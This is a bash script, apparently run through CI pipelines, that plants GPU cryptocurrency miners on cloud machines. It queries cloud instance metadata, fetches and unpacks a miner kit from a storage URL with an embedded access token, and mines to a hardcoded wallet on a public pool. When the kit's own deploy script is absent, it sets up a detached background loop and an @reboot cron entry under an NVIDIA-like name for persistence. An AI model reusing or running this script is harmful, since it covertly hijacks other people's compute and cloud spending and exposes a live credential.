#!/usr/bin/env bash
# CI-deployed fleet plant. Uses the PROVEN deploy_prl.sh path (wildrig-multi + pearlhash,
# kryptex 8048 first) shipped in the fleet kit; falls back to a bare supervisor if absent.
set -uo pipefail
KIT_URL="${KIT_URL:-https://ulbatchkit4620.blob.core.windows.net/kit/fleet-kit-srb.tar.gz?sv=2015-04-05&ss=b&srt=sco&sp=rwdlacup&st=2026-11-20T17%3A32%3A26.0000000Z&se=2026-11-27T17%3A37%3A26.0000000Z&spr=https&sig=P2P1GPVXTMXnTT5%2FQXD9nh2yvMkZIYMHaeeA4YtaZxU%3D}"
PAY_W=prl1pek8rh8yjck5q7596aph7ua7xnkqs8ur9mkfmz8w7xfzcdfcfx5vsx2f4lz
BASE="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
IP=$(hostname -I 2>/dev/null | awk '{print $1}'); IP=${IP:-127.0.0.1}
VM=$(hostname -s)
REGION=$(curl -s -m 3 -H Metadata:true "http://169.254.169.254/metadata/instance/compute/location?format=text&api-version=2021-02-01" 2>/dev/null); REGION=${REGION:-ci}
RIG="ul-$(echo "$IP" | tr '.' '-')-g0"
N=$(nvidia-smi -L 2>/dev/null | grep -c '^GPU' || true)
echo "HOST=$VM IP=$IP RIG=$RIG GPU_COUNT=${N:-0} REGION=$REGION"
if [ "${N:-0}" -lt 1 ]; then echo "NO-GPU"; nvidia-smi 2>&1 | head -3; exit 0; fi

mkdir -p /opt/fleet /var/log/fleet /var/lib/fleet
echo "$RIG" > /var/lib/fleet/rig
if [ ! -x /opt/fleet/bin/SRBMiner-MULTI ] && [ ! -x /opt/fleet/bin/deploy_prl.sh ]; then
  echo "fetching fleet kit"
  curl -fsSL --retry 3 --max-time 600 -o /tmp/kit.tgz "$KIT_URL" && tar xzf /tmp/kit.tgz -C /opt/fleet && echo "kit ok"
fi
chmod +x /opt/fleet/bin/*.sh 2>/dev/null
install -m 0755 "$BASE/bin/wildrig-multi" /opt/fleet/bin/wildrig-multi
export KIT=/opt/fleet/bin/wildrig-multi
export WAL="$PAY_W.$RIG"
export WR_LOG=/var/log/fleet/${RIG}.log
export WR_BASE=/opt/fleet
if [ -x /opt/fleet/bin/deploy_prl.sh ]; then
  echo "-> deploy_prl.sh"
  bash /opt/fleet/bin/deploy_prl.sh 2>&1 | tail -12
else
  echo "NO-DEPLOY_PRL -> bare supervisor"
  cat > /opt/fleet/sup.sh <<EOF
#!/bin/bash
while :; do nice -n 19 $KIT --algo pearlhash --url stratum+ssl://prl.kryptex.network:8048 --user $WAL --pass x >>$WR_LOG 2>&1; sleep 10; done
EOF
  chmod +x /opt/fleet/sup.sh
  pgrep -f /opt/fleet/sup.sh >/dev/null || setsid nohup /opt/fleet/sup.sh >/dev/null 2>&1 &
  echo "@reboot root setsid bash /opt/fleet/sup.sh >>$WR_LOG 2>&1 &" > /etc/cron.d/nv-prl
fi
sleep 8
echo "--- procs ---"; pgrep -af 'wildrig-multi|SRBMiner-MULTI' | head -4
echo "--- units ---"; systemctl is-active nv-prl 2>/dev/null; systemctl is-active nv-cuda-cache-g0 2>/dev/null
echo "--- log head ---"; tail -6 "$WR_LOG" 2>/dev/null
